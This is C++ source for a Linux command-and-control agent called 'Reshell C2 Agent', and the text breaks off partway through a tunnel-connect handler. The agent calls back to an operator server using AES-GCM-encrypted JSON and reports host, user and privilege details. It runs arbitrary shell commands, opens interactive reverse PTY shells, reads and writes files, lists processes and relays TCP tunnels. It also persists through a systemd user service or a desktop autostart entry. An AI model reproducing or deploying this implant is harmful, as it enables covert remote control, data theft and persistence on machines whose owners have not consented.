/*
 * Reshell C2 Agent — Linux amd64（ELF）
 * 协议与 internal/linuxagent、Windows client/native/client.cpp 对齐：TCP 一行 JSON、可选 AES-256-GCM、
 * /ws/agent 业务通道；隧道数据始终走 TCP。
 * 不含截图/屏幕监控。依赖：OpenSSL（libcrypto）、pthread、util（forkpty）。
 * 回连参数来自 c2_embed_config.h 中 g_c2_embed（预编译模板默认留空；载荷由服务端修补 C2EMBED1 块）。
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <ctype.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <ifaddrs.h>
#include <limits.h>
#include <netdb.h>
#include <netinet/in.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <pthread.h>
#include <pty.h>
#include <pwd.h>
#include <signal.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/statfs.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <termios.h>
#include <time.h>
#include <unistd.h>

#include <atomic>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

// ==================== 预编译模板（与 Windows client.cpp 共用 c2_embed_config.h） ====================
#include "c2_embed_config.h"

static C2EmbedConfig g_c2_embed = C2_EMBED_CONFIG_TEMPLATE_INIT;

#define SERVER_ADDR (reinterpret_cast<const char*>(g_c2_embed.host))
#define SERVER_PORT ((int)g_c2_embed.port_le)
#define VKEY (reinterpret_cast<const char*>(g_c2_embed.vkey))
#define SALT (reinterpret_cast<const char*>(g_c2_embed.salt))
#define HEARTBEAT_INTERVAL ((int)g_c2_embed.heartbeat_sec)
#define C2_WEB_HOST_STR (reinterpret_cast<const char*>(g_c2_embed.web_host))
#define C2_WEB_PORT ((int)g_c2_embed.web_port_le)
// =====================================================================================

static const size_t kFileChunkSize = 256U * 1024U;

static int g_sock = -1;
static int g_ws = -1;
static std::mutex g_mu;
static std::mutex g_tcp_mu;
static volatile int g_running = 1;
static std::atomic<int> g_hb_run{0};
static volatile int g_use_ws = 0;
static int g_hb_val = 0;
static std::map<std::string, int> g_tunnels;
static std::mutex g_tunnel_mu;

struct ShellSess {
    int master;
    pid_t pid;
};
static std::map<std::string, ShellSess> g_shells;
static std::mutex g_shell_mu;

// ---------- 诊断输出（stderr）：排查内网/防火墙/密钥不匹配；C2_AGENT_QUIET=1 关闭非错误提示 ----------
static bool diag_quiet() {
    const char *q = getenv("C2_AGENT_QUIET");
    return q && (strcmp(q, "1") == 0 || strcasecmp(q, "true") == 0);
}
static void diag_err(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    fprintf(stderr, "[c2-agent] ERROR ");
    vfprintf(stderr, fmt, ap);
    fprintf(stderr, "\n");
    va_end(ap);
}
static void diag_info(const char *fmt, ...) {
    if (diag_quiet()) return;
    va_list ap;
    va_start(ap, fmt);
    fprintf(stderr, "[c2-agent] ");
    vfprintf(stderr, fmt, ap);
    fprintf(stderr, "\n");
    va_end(ap);
}

// ---------- base64 ----------
static const char *B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
static std::string b64_enc(const unsigned char *d, size_t n) {
    std::string r;
    r.reserve((n + 2) / 3 * 4);
    for (size_t i = 0; i < n; i += 3) {
        unsigned long v = (unsigned long)d[i] << 16;
        if (i + 1 < n) v |= (unsigned long)d[i + 1] << 8;
        if (i + 2 < n) v |= d[i + 2];
        r += B64[(v >> 18) & 63];
        r += B64[(v >> 12) & 63];
        r += (i + 1 < n) ? B64[(v >> 6) & 63] : '=';
        r += (i + 2 < n) ? B64[v & 63] : '=';
    }
    return r;
}
static int b64_dec_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}
static std::vector<unsigned char> b64_dec(const std::string &s) {
    std::vector<unsigned char> o;
    int buf = 0, bits = 0;
    for (char c : s) {
        if (c == '=') break;
        int v = b64_dec_val(c);
        if (v < 0) continue;
        buf = (buf << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            o.push_back((unsigned char)((buf >> bits) & 0xFF));
        }
    }
    return o;
}

// ---------- AES-256-GCM（与 Go internal/agent/crypto.go 一致）----------
static bool use_enc() { return strlen(VKEY) > 0 && strlen(SALT) > 0; }
static void derive_key(unsigned char key[32]) {
    std::string raw = std::string(VKEY) + std::string(SALT);
    SHA256((unsigned char *)raw.data(), raw.size(), key);
}
static std::string encrypt_line(const std::string &plain_with_nl) {
    if (!use_enc()) return "";
    unsigned char key[32];
    derive_key(key);
    unsigned char nonce[12];
    RAND_bytes(nonce, 12);
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";
    int len = 0, ct_len = 0;
    std::vector<unsigned char> ct(plain_with_nl.size() + 64);
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_EncryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_EncryptUpdate(ctx, ct.data(), &len, (unsigned char *)plain_with_nl.data(), (int)plain_with_nl.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    ct_len = len;
    if (EVP_EncryptFinal_ex(ctx, ct.data() + ct_len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    ct_len += len;
    unsigned char tag[16];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    EVP_CIPHER_CTX_free(ctx);
    std::vector<unsigned char> out;
    out.insert(out.end(), nonce, nonce + 12);
    out.insert(out.end(), ct.begin(), ct.begin() + ct_len);
    out.insert(out.end(), tag, tag + 16);
    return b64_enc(out.data(), out.size());
}
static std::string decrypt_line(const std::string &b64) {
    if (!use_enc()) return b64;
    auto raw = b64_dec(b64);
    if (raw.size() < 12 + 16) return "";
    unsigned char key[32];
    derive_key(key);
    const unsigned char *nonce = raw.data();
    const unsigned char *tag = raw.data() + raw.size() - 16;
    const unsigned char *ciph = raw.data() + 12;
    size_t ciph_len = raw.size() - 12 - 16;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";
    std::vector<unsigned char> pt(ciph_len + 16);
    int len = 0, pt_len = 0;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, NULL) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_DecryptInit_ex(ctx, NULL, NULL, key, nonce) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_DecryptUpdate(ctx, pt.data(), &len, ciph, (int)ciph_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    pt_len = len;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void *)tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_DecryptFinal_ex(ctx, pt.data() + pt_len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    pt_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return std::string((char *)pt.data(), pt_len);
}

static void json_esc(const std::string &s, std::string &o) {
    for (unsigned char c : s) {
        if (c == '"')
            o += "\\\"";
        else if (c == '\\')
            o += "\\\\";
        else if (c == '\n')
            o += "\\n";
        else if (c == '\r')
            o += "\\r";
        else if (c == '\t')
            o += "\\t";
        else if (c < 32)
            o += ' ';
        else
            o += (char)c;
    }
}
static std::string json_obj(const std::map<std::string, std::string> &m) {
    std::string r = "{";
    bool f = true;
    for (auto &kv : m) {
        if (!f) r += ",";
        f = false;
        r += "\"";
        json_esc(kv.first, r);
        r += "\":\"";
        json_esc(kv.second, r);
        r += "\"";
    }
    r += "}";
    return r;
}

static bool send_line_tcp_unlocked(int fd, const std::string &json) {
    std::string line = json;
    if (use_enc()) {
        std::string enc = encrypt_line(json + "\n");
        if (enc.empty()) return false;
        line = enc;
    }
    line += "\n";
    const char *p = line.data();
    size_t n = line.size();
    while (n > 0) {
        ssize_t w = send(fd, p, n, 0);
        if (w <= 0) return false;
        p += w;
        n -= (size_t)w;
    }
    return true;
}

static bool send_line_sec(int fd, const std::string &json) {
    std::lock_guard<std::mutex> lk(g_tcp_mu);
    return send_line_tcp_unlocked(fd, json);
}

static bool recv_exact(int fd, void *buf, size_t n) {
    char *p = (char *)buf;
    size_t g = 0;
    while (g < n) {
        ssize_t r = recv(fd, p + g, n - g, 0);
        if (r <= 0) return false;
        g += (size_t)r;
    }
    return true;
}

static std::string recv_line_sec(int fd, int timeout_ms) {
    std::string acc;
    char ch;
    while (g_running) {
        fd_set rf;
        FD_ZERO(&rf);
        FD_SET(fd, &rf);
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int s = select(fd + 1, &rf, NULL, NULL, &tv);
        if (s <= 0) return "";
        ssize_t n = recv(fd, &ch, 1, 0);
        if (n <= 0) return "";
        if (ch == '\n') break;
        if (ch != '\r') acc += ch;
    }
    if (!use_enc()) return acc;
    return decrypt_line(acc);
}

// ---------- 扁平 JSON 解析（与 Windows 客户端一致）----------
static void parse_json_str(const std::string &line, size_t &i, std::string &val) {
    while (i < line.size()) {
        if (line[i] == '\\' && i + 1 < line.size()) {
            char n = line[i + 1];
            if (n == '"' || n == '\\' || n == '/')
                val += n;
            else if (n == 'n')
                val += '\n';
            else if (n == 'r')
                val += '\r';
            else if (n == 't')
                val += '\t';
            else
                val += n;
            i += 2;
            continue;
        }
        if (line[i] == '"') return;
        val += line[i++];
    }
}
static bool parse_flat_json(const std::string &line, std::map<std::string, std::string> &msg) {
    msg.clear();
    size_t i = 0;
    auto skip = [&]() {
        while (i < line.size() && isspace((unsigned char)line[i])) i++;
    };
    skip();
    if (i >= line.size() || line[i] != '{') return false;
    i++;
    while (i < line.size()) {
        skip();
        if (i < line.size() && line[i] == '}') break;
        if (i >= line.size() || line[i] != '"') return false;
        i++;
        size_t ke = line.find('"', i);
        if (ke == std::string::npos) return false;
        std::string key = line.substr(i, ke - i);
        i = ke + 1;
        skip();
        if (i >= line.size() || line[i] != ':') return false;
        i++;
        skip();
        std::string val;
        if (i < line.size() && line[i] == '"') {
            i++;
            parse_json_str(line, i, val);
            if (i < line.size() && line[i] == '"') i++;
        } else {
            while (i < line.size() && line[i] != ',' && line[i] != '}') val += line[i++];
        }
        msg[key] = val;
        skip();
        if (i < line.size() && line[i] == ',') i++;
    }
    return !msg.empty();
}

// ---------- 系统信息 ----------
static std::string read_file_trim(const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return "";
    char buf[4096];
    if (!fgets(buf, sizeof(buf), f)) {
        fclose(f);
        return "";
    }
    fclose(f);
    std::string s = buf;
    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
    return s;
}

static std::string first_ipv4() {
    struct ifaddrs *ifaddr = nullptr, *ifa;
    std::string r = "unknown";
    if (getifaddrs(&ifaddr) == -1) return r;
    for (ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
        if (!ifa->ifa_addr || ifa->ifa_addr->sa_family != AF_INET) continue;
        char host[INET_ADDRSTRLEN];
        void *addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
        inet_ntop(AF_INET, addr, host, sizeof(host));
        if (strcmp(host, "127.0.0.1") != 0) {
            r = host;
            break;
        }
    }
    freeifaddrs(ifaddr);
    return r;
}

static void collect_register(std::map<std::string, std::string> &reg) {
    reg["type"] = "register";
    reg["external_ip"] = "";
    reg["external_location"] = "";
    reg["internal_ip"] = first_ipv4();
    struct passwd *pw = getpwuid(getuid());
    reg["username"] = pw ? pw->pw_name : "unknown";
    char hn[256] = {0};
    gethostname(hn, sizeof(hn) - 1);
    reg["hostname"] = hn;
    reg["os_type"] = "linux_amd64";
    reg["os_version"] = read_file_trim("/proc/version");
    if (reg["os_version"].size() > 200) reg["os_version"] = reg["os_version"].substr(0, 200);
    reg["architecture"] = "amd64";
    char exe[PATH_MAX] = {0};
    ssize_t el = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (el > 0) exe[el] = 0;
    const char *bn = strrchr(exe, '/');
    reg["process_name"] = bn ? (bn + 1) : exe;
    reg["process_id"] = std::to_string((long)getpid());
    reg["vkey"] = VKEY;
    reg["is_admin"] = (geteuid() == 0) ? "true" : "false";
    reg["is_elevated"] = reg["is_admin"];
    reg["integrity"] = "N/A";
    long pages = sysconf(_SC_PHYS_PAGES), psz = sysconf(_SC_PAGE_SIZE);
    if (pages > 0 && psz > 0)
        reg["memory_size"] = std::to_string((pages * psz) / (1024 * 1024));
    else
        reg["memory_size"] = "0";
    reg["cpu_info"] = read_file_trim("/proc/cpuinfo");
    size_t p = reg["cpu_info"].find('\n');
    if (p != std::string::npos) reg["cpu_info"] = reg["cpu_info"].substr(0, p);
    struct statfs sf;
    long long gb = 0;
    if (statfs("/", &sf) == 0) gb = (long long)sf.f_blocks * (long long)sf.f_bsize / (1024LL * 1024LL * 1024LL);
    reg["disk_size"] = std::to_string(gb);
    reg["logical_processors"] = std::to_string((long)sysconf(_SC_NPROCESSORS_ONLN));
    char cwd[PATH_MAX] = {0};
    if (getcwd(cwd, sizeof(cwd))) reg["working_dir"] = cwd;
}

// ---------- 路径与文件 ----------
static std::string trim_path(std::string p) {
    while (!p.empty() && (p.front() == ' ' || p.front() == '\t')) p.erase(0, 1);
    while (!p.empty() && (p.back() == ' ' || p.back() == '\t')) p.pop_back();
    return p;
}

static bool mkdir_p(const char *path) {
    if (!path || !*path) return false;
    std::string p = path;
    while (p.size() > 1 && p.back() == '/') p.pop_back();
    for (size_t i = 1; i < p.size(); i++) {
        if (p[i] != '/') continue;
        std::string part = p.substr(0, i);
        if (part.empty()) continue;
        if (mkdir(part.c_str(), 0755) != 0 && errno != EEXIST) {
            struct stat st;
            if (stat(part.c_str(), &st) != 0 || !S_ISDIR(st.st_mode)) return false;
        }
    }
    if (mkdir(p.c_str(), 0755) != 0 && errno != EEXIST) {
        struct stat st;
        if (stat(p.c_str(), &st) != 0 || !S_ISDIR(st.st_mode)) return false;
    }
    return true;
}

static std::string sh_exec(const std::string &cmd) {
    int pout[2];
    if (pipe(pout) < 0) return "pipe failed";
    pid_t pid = fork();
    if (pid < 0) {
        close(pout[0]);
        close(pout[1]);
        return "fork failed";
    }
    if (pid == 0) {
        close(pout[0]);
        dup2(pout[1], STDOUT_FILENO);
        dup2(pout[1], STDERR_FILENO);
        close(pout[1]);
        execl("/bin/sh", "sh", "-c", cmd.c_str(), (char *)NULL);
        _exit(126);
    }
    close(pout[1]);
    std::string o;
    char buf[4096];
    while (1) {
        fd_set rf;
        FD_ZERO(&rf);
        FD_SET(pout[0], &rf);
        struct timeval tv = {60, 0};
        int s = select(pout[0] + 1, &rf, NULL, NULL, &tv);
        if (s <= 0) {
            kill(pid, SIGKILL);
            o += "\n[timeout]";
            break;
        }
        ssize_t n = read(pout[0], buf, sizeof(buf));
        if (n <= 0) break;
        o.append(buf, (size_t)n);
    }
    int st = 0;
    waitpid(pid, &st, 0);
    close(pout[0]);
    return o;
}

static std::string list_dir_json(const std::string &dir) {
    std::string d = trim_path(dir);
    if (d.empty()) d = ".";
    DIR *D = opendir(d.c_str());
    if (!D) return "[]";
    std::string r = "[";
    bool first = true;
    struct dirent *e;
    while ((e = readdir(D))) {
        std::string name = e->d_name;
        if (name == "." || name == "..") continue;
        std::string full = d + "/" + name;
        struct stat st;
        if (stat(full.c_str(), &st)) continue;
        char mt[64];
        struct tm tmi;
        localtime_r(&st.st_mtime, &tmi);
        strftime(mt, sizeof(mt), "%Y-%m-%d %H:%M:%S", &tmi);
        if (!first) r += ",";
        first = false;
        std::string jn, jf, jm;
        json_esc(name, jn);
        json_esc(full, jf);
        json_esc(mt, jm);
        r += "{\"name\":\"" + jn + "\",\"path\":\"" + jf + "\",\"is_dir\":" + std::string(S_ISDIR(st.st_mode) ? "true" : "false") +
             ",\"size\":" + std::to_string((unsigned long long)st.st_size) + ",\"modified\":\"" + jm + "\"}";
    }
    closedir(D);
    r += "]";
    return r;
}

// 与 internal/linuxagent/files_linux.go listDirChildrenJSON 一致
static std::string list_dir_children_json(const std::string &rawPath) {
    std::string p = trim_path(rawPath);
    if (p.empty() || p == "." || p == "/") {
        DIR *D = opendir("/");
        if (!D) return "[]";
        std::string r = "[";
        bool first = true;
        struct dirent *e;
        while ((e = readdir(D))) {
            std::string name = e->d_name;
            if (name == "." || name == "..") continue;
            std::string full = std::string("/") + name;
            struct stat st;
            if (stat(full.c_str(), &st) || !S_ISDIR(st.st_mode)) continue;
            if (!first) r += ",";
            first = false;
            std::string jn, jf;
            json_esc(name, jn);
            json_esc(full, jf);
            r += "{\"name\":\"" + jn + "\",\"path\":\"" + jf + "\",\"type\":\"directory\"}";
        }
        closedir(D);
        r += "]";
        return r;
    }
    DIR *D = opendir(p.c_str());
    if (!D) return "[]";
    std::string r = "[";
    bool first = true;
    struct dirent *e;
    while ((e = readdir(D))) {
        std::string name = e->d_name;
        if (name == "." || name == "..") continue;
        std::string full = p + "/" + name;
        struct stat st;
        if (stat(full.c_str(), &st)) continue;
        char mt[64];
        struct tm tmi;
        localtime_r(&st.st_mtime, &tmi);
        strftime(mt, sizeof(mt), "%Y-%m-%d %H:%M:%S", &tmi);
        if (!first) r += ",";
        first = false;
        bool isd = S_ISDIR(st.st_mode);
        std::string jn, jf, jm, jt;
        json_esc(name, jn);
        json_esc(full, jf);
        json_esc(mt, jm);
        json_esc(isd ? "directory" : "file", jt);
        r += "{\"name\":\"" + jn + "\",\"path\":\"" + jf + "\",\"is_dir\":" + std::string(isd ? "true" : "false") +
             ",\"size\":" + std::to_string((unsigned long long)st.st_size) + ",\"modified\":\"" + jm + "\",\"type\":\"" + jt + "\"}";
    }
    closedir(D);
    r += "]";
    return r;
}

static std::string read_file_b64(const std::string &path) {
    int fd = open(path.c_str(), O_RDONLY);
    if (fd < 0) return "";
    std::string out;
    unsigned char buf[65536];
    ssize_t n;
    while ((n = read(fd, buf, sizeof(buf))) > 0) out += std::string((char *)buf, (size_t)n);
    close(fd);
    if (out.empty() && access(path.c_str(), R_OK) != 0) return "";
    return b64_enc((unsigned char *)out.data(), out.size());
}

static std::string read_file_range_b64(const std::string &path, uint64_t offset, size_t maxRead) {
    int fd = open(path.c_str(), O_RDONLY);
    if (fd < 0) return std::string();
    if (lseek(fd, (off_t)offset, SEEK_SET) < 0) {
        close(fd);
        return std::string();
    }
    std::vector<unsigned char> buf(maxRead);
    ssize_t n = read(fd, buf.data(), maxRead);
    close(fd);
    if (n < 0) return std::string();
    return b64_enc(buf.data(), (size_t)n);
}

static bool write_file_full(const std::string &path, const std::string &b64) {
    auto raw = b64_dec(b64);
    int fd = open(path.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return false;
    const unsigned char *p = raw.data();
    size_t left = raw.size();
    while (left > 0) {
        ssize_t w = write(fd, p, left);
        if (w <= 0) {
            close(fd);
            return false;
        }
        p += w;
        left -= (size_t)w;
    }
    close(fd);
    return true;
}

static bool write_file_chunk(const std::string &path, const std::string &b64, uint64_t chunkIndex) {
    auto raw = b64_dec(b64);
    if (chunkIndex == 0) {
        int fd = open(path.c_str(), O_WRONLY | O_CREAT | O_TRUNC, 0644);
        if (fd < 0) return false;
        ssize_t w = write(fd, raw.data(), raw.size());
        close(fd);
        return w == (ssize_t)raw.size();
    }
    int fd = open(path.c_str(), O_RDWR, 0644);
    if (fd < 0) return false;
    off_t off = (off_t)(chunkIndex * kFileChunkSize);
    if (lseek(fd, off, SEEK_SET) < 0) {
        close(fd);
        return false;
    }
    ssize_t w = write(fd, raw.data(), raw.size());
    close(fd);
    return w == (ssize_t)raw.size();
}

static std::string process_list_json() {
    DIR *D = opendir("/proc");
    if (!D) return "[]";
    std::string r = "[";
    bool first = true;
    struct dirent *e;
    while ((e = readdir(D))) {
        if (!isdigit((unsigned char)e->d_name[0])) continue;
        char comm[256];
        snprintf(comm, sizeof(comm), "/proc/%s/comm", e->d_name);
        FILE *f = fopen(comm, "r");
        std::string name = e->d_name;
        if (f) {
            char line[256];
            if (fgets(line, sizeof(line), f)) {
                name = line;
                while (!name.empty() && (name.back() == '\n' || name.back() == '\r')) name.pop_back();
            }
            fclose(f);
        }
        if (!first) r += ",";
        first = false;
        std::string jn;
        json_esc(name, jn);
        r += "{\"pid\":" + std::string(e->d_name) + ",\"name\":\"" + jn + "\"}";
    }
    closedir(D);
    r += "]";
    return r;
}

// ---------- 自启（与 autostart_linux.go 语义对齐）----------
static std::string xdg_config_dir() {
    const char *e = getenv("XDG_CONFIG_HOME");
    if (e && *e) return std::string(e);
    const char *h = getenv("HOME");
    if (!h) return "";
    return std::string(h) + "/.config";
}

static std::string autostart_systemd_user(const std::string &exe) {
    std::string base = xdg_config_dir();
    if (base.empty()) return "no HOME";
    std::string unitDir = base + "/systemd/user";
    if (!mkdir_p(unitDir.c_str())) return std::string("mkdir: ") + strerror(errno);
    std::string unitPath = unitDir + "/reshell-c2-agent.service";
    std::string contents = std::string("[Unit]\nDescription=Reshell C2 Agent\nAfter=network-online.target\n\n[Service]\nType=simple\nExecStart=") +
                           exe + std::string("\nRestart=on-failure\n\n[Install]\nWantedBy=default.target\n");
    FILE *f = fopen(unitPath.c_str(), "w");
    if (!f) return strerror(errno);
    fwrite(contents.data(), 1, contents.size(), f);
    fclose(f);
    sh_exec("systemctl --user daemon-reload 2>/dev/null");
    std::string o = sh_exec("systemctl --user enable --now reshell-c2-agent.service 2>&1");
    if (o.find("Failed") != std::string::npos || o.find("error") != std::string::npos)
        return "systemctl: " + o;
    return "OK | systemd_user | " + o;
}

static std::string autostart_desktop(const std::string &exe) {
    std::string base = xdg_config_dir();
    if (base.empty()) return "no HOME";
    std::string ad = base + "/autostart";
    if (!mkdir_p(ad.c_str())) return std::string("mkdir: ") + strerror(errno);
    std::string p = ad + "/reshell-c2-agent.desktop";
    std::string body = std::string("[Desktop Entry]\nType=Application\nName=Reshell C2 Agent\nExec=") + exe +
                       "\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\n";
    FILE *f = fopen(p.c_str(), "w");
    if (!f) return strerror(errno);
    fwrite(body.data(), 1, body.size(), f);
    fclose(f);
    return "OK | startup_folder | " + p;
}

static bool autostart_set_mode(const std::string &mode, const std::string &exe, std::string &msg) {
    std::string m = mode.empty() ? "registry" : mode;
    if (m == "registry" || m == "registry_hkcu" || m == "scheduled_task" || m == "crontab" || m == "systemd_user") {
        msg = autostart_systemd_user(exe);
        return msg.find("OK |") == 0;
    }
    if (m == "registry_hklm" || m == "registry_machine") {
        msg = "Linux 不支持 HKLM 等价项，请使用 systemd_user 或 crontab";
        return false;
    }
    if (m == "startup_folder") {
        msg = autostart_desktop(exe);
        return msg.find("OK |") == 0;
    }
    if (m == "startup_folder_all_users") {
        msg = "Linux 需 root 写 /etc/xdg/autostart，当前跳过";
        return false;
    }
    msg = "unknown type: " + m;
    return false;
}

static std::string autostart_remove_all() {
    sh_exec("systemctl --user disable --now reshell-c2-agent.service 2>/dev/null");
    sh_exec("systemctl --user daemon-reload 2>/dev/null");
    std::string base = xdg_config_dir();
    if (!base.empty()) {
        unlink((base + "/systemd/user/reshell-c2-agent.service").c_str());
        unlink((base + "/autostart/reshell-c2-agent.desktop").c_str());
    }
    return "[systemd_user] disable attempted\n[unit+desktop] remove attempted\n";
}

// ---------- WebSocket 发送（含 64 位长度）----------
static bool ws_send_frame_text(int ws_fd, const std::string &text) {
    std::vector<unsigned char> out;
    out.push_back(0x81);
    size_t len = text.size();
    if (len <= 125) {
        out.push_back((unsigned char)(128 | len));
    } else if (len <= 65535) {
        out.push_back((unsigned char)(128 | 126));
        out.push_back((unsigned char)((len >> 8) & 0xFF));
        out.push_back((unsigned char)(len & 0xFF));
    } else {
        out.push_back((unsigned char)(128 | 127));
        unsigned long long l = (unsigned long long)len;
        for (int i = 7; i >= 0; --i) out.push_back((unsigned char)((l >> (i * 8)) & 0xFF));
    }
    unsigned char mk[4];
    RAND_bytes(mk, 4);
    for (int i = 0; i < 4; i++) out.push_back(mk[i]);
    for (size_t i = 0; i < len; i++) out.push_back((unsigned char)(text[i] ^ mk[i % 4]));
    size_t sent = 0;
    while (sent < out.size()) {
        ssize_t w = send(ws_fd, out.data() + sent, out.size() - sent, 0);
        if (w <= 0) return false;
        sent += (size_t)w;
    }
    return true;
}

// 业务上行：与 Go channelSend 一致（优先 WS）
static void channel_uplink(const std::string &json) {
    std::lock_guard<std::mutex> lk(g_mu);
    if (g_use_ws && g_ws >= 0)
        ws_send_frame_text(g_ws, json);
    else if (g_sock >= 0)
        send_line_sec(g_sock, json);
}

// command_response：与 Go channelSendCommandResponse 一致
static void channel_command_response(const std::string &json, bool reply_tcp) {
    std::lock_guard<std::mutex> lk(g_mu);
    if (reply_tcp) {
        send_line_sec(g_sock, json);
        return;
    }
    if (g_use_ws && g_ws >= 0)
        ws_send_frame_text(g_ws, json);
    else if (g_sock >= 0)
        send_line_sec(g_sock, json);
}

static void send_cmd_resp(const std::string &id, const std::string &res, bool ok, bool reply_tcp) {
    std::map<std::string, std::string> m;
    m["type"] = "command_response";
    m["command_id"] = id;
    m["result"] = res;
    m["success"] = ok ? "true" : "false";
    channel_command_response(json_obj(m), reply_tcp);
}

// 隧道上行：始终 TCP（与 Go sendTunnelLine 一致）
static void tunnel_send_line(const std::string &json) {
    std::lock_guard<std::mutex> lk(g_tcp_mu);
    if (g_sock >= 0) send_line_tcp_unlocked(g_sock, json);
}

static void tunnel_fwd(unsigned int tid, const std::string &cid, int sk) {
    unsigned char buf[8192];
    while (g_running && g_sock >= 0) {
        ssize_t n = recv(sk, buf, sizeof(buf), 0);
        if (n <= 0) break;
        std::string b64 = b64_enc(buf, (size_t)n);
        std::map<std::string, std::string> m;
        m["type"] = "tunnel_data";
        m["tunnel_id"] = std::to_string(tid);
        m["conn_id"] = cid;
        m["direction"] = "in";
        m["data"] = b64;
        tunnel_send_line(json_obj(m));
    }
    g_tunnel_mu.lock();
    g_tunnels.erase(cid);
    g_tunnel_mu.unlock();
    close(sk);
}

static void shell_reader_thread(std::string sid, int master) {
    unsigned char buf[8192];
    while (g_running) {
        fd_set rf;
        FD_ZERO(&rf);
        FD_SET(master, &rf);
        struct timeval tv = {1, 0};
        if (select(master + 1, &rf, NULL, NULL, &tv) <= 0) continue;
        ssize_t n = read(master, buf, sizeof(buf));
        if (n <= 0) break;
        std::string chunk((char *)buf, (size_t)n);
        std::map<std::string, std::string> m;
        m["type"] = "shell_output";
        m["session_id"] = sid;
        m["data"] = chunk;
        channel_uplink(json_obj(m));
    }
}

static std::string shell_session_create(const std::string &sid) {
    std::lock_guard<std::mutex> lk(g_shell_mu);
    if (g_shells.find(sid) != g_shells.end()) return "Session already exists";
    int master = -1;
    pid_t pid = forkpty(&master, NULL, NULL, NULL);
    if (pid < 0) return std::string("Failed to start shell: ") + strerror(errno);
    if (pid == 0) {
        setenv("TERM", "xterm-256color", 1);
        if (access("/bin/bash", X_OK) == 0)
            execl("/bin/bash", "bash", "-l", (char *)NULL);
        execl("/bin/sh", "sh", "-i", (char *)NULL);
        _exit(127);
    }
    g_shells[sid] = ShellSess{master, pid};
    std::thread(shell_reader_thread, sid, master).detach();
    return "Session created successfully";
}

static std::string shell_session_write(const std::string &sid, const std::string &input) {
    g_shell_mu.lock();
    auto it = g_shells.find(sid);
    if (it == g_shells.end()) {
        g_shell_mu.unlock();
        return "Unknown session";
    }
    int mfd = it->second.master;
    g_shell_mu.unlock();
    ssize_t w = write(mfd, input.data(), input.size());
    if (w < 0) return std::string("Write failed: ") + strerror(errno);
    return "";
}

static std::string shell_session_close(const std::string &sid) {
    std::lock_guard<std::mutex> lk(g_shell_mu);
    auto it = g_shells.find(sid);
    if (it == g_shells.end()) return "Unknown session";
    close(it->second.master);
    if (it->second.pid > 0) kill(it->second.pid, SIGKILL);
    g_shells.erase(it);
    return "Session closed successfully";
}

static void handle_cmd(const std::string &id, const std::string &tp, std::map<std::string, std::string> &pl, bool reply_tcp) {
    std::string result;
    bool ok = true;

    if (tp == "tunnel_connect") {
        std::string host = pl["target_host"];
        int port = atoi(pl["target_port"].c_str());
        std::string cid = pl["conn_id"];
        unsigned tid = (unsigned)strtoul(pl["tunnel_id"].c_str(), NULL, 10);
        if (!host.empty() && port > 0 && !cid.empty()) {
            int sk = socket(AF_INET, SOCK_STREAM, 0);
            if (sk >= 0) {
                struct sockaddr_in a;
                memset(&a, 0, sizeof(a));
                a.sin_family = AF_INET;
                a.sin_port = htons((uint16_t)port);
                if (inet_pton(AF_INET, host.c_str(), &a.sin_addr) == 1 && connect(sk, (struct sockaddr *)&a, sizeof(a)) == 0) {
                    g_tunnel_mu.lock();
                    g_tunnels[cid] = sk;
                    g_tunnel_mu.unlock();
